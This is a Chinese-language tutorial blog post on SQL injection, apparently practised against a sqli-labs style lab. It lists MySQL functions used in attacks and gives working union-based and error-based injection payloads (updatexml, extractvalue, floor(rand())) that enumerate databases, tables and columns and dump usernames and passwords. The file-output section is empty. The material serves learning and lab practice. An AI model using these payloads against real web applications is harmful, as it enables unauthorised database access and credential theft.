---
title: sql注入的原理
date: 2020-01-05 16:08:54
tags:
 - web
 - sql
categories: 
 - 日常积累
---

## 0x00 介绍

SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

<!--more-->

## 0x01 某些函数的使用方法

1. concat(str1,str2,str3,...),将多个字符串连接成一个字符串。

2. concat_ws(分隔符, str1, str2, ...),添加了分割符（concat_ws就是concat with separator）
3. group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator '分隔符'] )，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。

[参考文章](https://blog.csdn.net/Mary19920410/article/details/76545053)

4. if(表达式1，表达式2，表达式3)，如果表达式1的值为真，执行表达式2，否则执行表达式3
5. substr(str,pos,len)/  mid(str,pos,len),从pos处开始截取，截取长度为len的字符 

   - MySQL: SUBSTR( ), SUBSTRING( )
   - Oracle: SUBSTR( )
   - SQL Server: SUBSTRING( ) 
6. char()**将十进制数转换成字符**，在过滤掉单双引号的时使用较多；与其相反的是ascii()函数
7. sleep(n)，暂停数据库n秒，benchmarlk(count，表达式)，将表达式执行count次可以达到延迟效果
8. Length() 返回字符串的长度
9. database() 返回当前数据库名称
10. count(*) ,计数
11. floor(value)函数返回小于或等于指定值（value）的最小整数
12. ceiling(value)函数返回大于或等于指定值（value）的最小整数
13. rand()产生随机数介于0和1之间的一个数,rand(0)，则返回值都为`0.15522042769493574`
14. 查询xml函数**extractvalue(目标xml文档，xml路径)**与更新xml函数**updatexml(目标xml文档，xml路径，更新的内容)**  最大只能出32字符
15. reverse(str)翻转字符串
16. limit pos,len，   从pos开始查询，查询len条数据    
17. set 可以设置变量
18. prepare 预处理
19. 

## 0x02 操作过程与分析

### a. 基本注入

1. 使用order/group by 判断字段长度

   users表中内容

   ```shell
   mysql> select * from users
       -> ;
   +----+----------+------------+
   | id | username | password   |
   +----+----------+------------+
   |  1 | Dumb     | Dumb       |
   |  2 | Angelina | I-kill-you |
   |  3 | Dummy    | p@ssword   |
   |  4 | secure   | crappy     |
   |  5 | stupid   | stupidity  |
   |  6 | superman | genious    |
   |  7 | batman   | mob!le     |
   |  8 | admin    | admin      |
   +----+----------+------------+
   ```

   `?id=%27 order by 3 %23`

   `?id=%27 order by 4 %23`

   ![](/pic/28.png)

   ![](/pic/29.png)

   4报错，3没有报错，表示此表有三列。

   *sql 控制台的执行结果*

   ```
   mysql> select * from users where id=0 order by 4;
   ERROR 1054 (42S22): Unknown column '4' in 'order clause'
   mysql> select * from user where id=0 order by 3;
   Empty set (0.00 sec)
   
   ```

   查看回显位置

   `?id=%27 union select 1,2,3 %23`

   ![](/pic/30.png)  2，3处有回显。

   *sql控制台执行结果*

   ```
   mysql> select * from user where id=0 union select 1,2,3;
   +------+----------+----------+
   | id   | username | password |
   +------+----------+----------+
   |    1 | 2        | 3        |
   +------+----------+----------+
   1 row in set (0.00 sec)
   ```

   因为sql控制台是所有都显示的，网页的界面的前端代码设置回显。

2. 获取数据库名

   `?id=%27 union select 1,database() ,3 %23`

   ![](/pic/31.png)

   ````
   mysql> select * from users where id=0 union select 1,database(),3;
   +----+----------+----------+
   | id | username | password |
   +----+----------+----------+
   |  1 | security | 3        |
   +----+----------+----------+
   1 row in set (0.00 sec)
   ````

3. 获取表名

   在mysql的数据库中包含一个数据库，information_schema，其中的tables表中记录所有数据库的表名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名

   ![](/32.png)

   `?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema='security' %23`

   ![](/33.png)

4. 获取列名

   在information_schema中，columns表中记录所有数据库所有表的列名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名，column_name,记录的是列名

   ```
   mysql> select * from columns where table_name='users' and table_schema='security'
       -> ;
   +---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+
   | TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME    | COLUMN_TYPE | COLUMN_KEY | EXTRA          | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION |
   +---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+
   | def           | security     | users      | id          |                1 | NULL           | NO          | int       |                     NULL |                   NULL |                10 |             0 |               NULL | NULL               | NULL              | int(3)      | PRI        | auto_increment | select,insert,update,references |                |                       |
   | def           | security     | users      | username    |                2 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |
   | def           | security     | users      | password    |                3 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |
   +---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+
   3 rows in set (0.00 sec)
   ```

   `?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema='security' %23`

   ![](/34.png)

5. 获取内容

   获取users表的username和password

   `?id=%27 union select 1,group_concat(username) ,group_concat(password)  from users %23`

   ![](/35.png)

### b. 报错注入

1. 查询数据库

   `?id=0' and updatexml(1,concat(1,(select database())),1)%23`

   或者`?id=0' and extractvalue(1,concat(1,(select database())))%23`

   `?id=0' and (select 1 from (select count(*),concat((select database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+`(在测试时，这一条buu上无回显，但是本地是可以的，**此条语句最多能显示64个字符，上面两条最多32个**)

   ![](/36.png)

2.  查询表名 *与基本注入相同不在重复*

3.  查询列名 *与基本注入相同不在重复*

4.  查信息

   `?id=0' and extractvalue(1,concat(1,(select substr(concat(username,'~',password),1,30) from users limit 2,1 )))%23`

   或者

   `?id=0' and updatexml(1,concat(1,(select substr(concat(username,'~',password),1,30) from users limit 2,1 )),1)%23`

   或者

   `?id=0' and (select 0 from (select count(*),concat((select concat(username,'~',password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+`

   通过修改limit 一条一条查询

### c. 输出文件注入



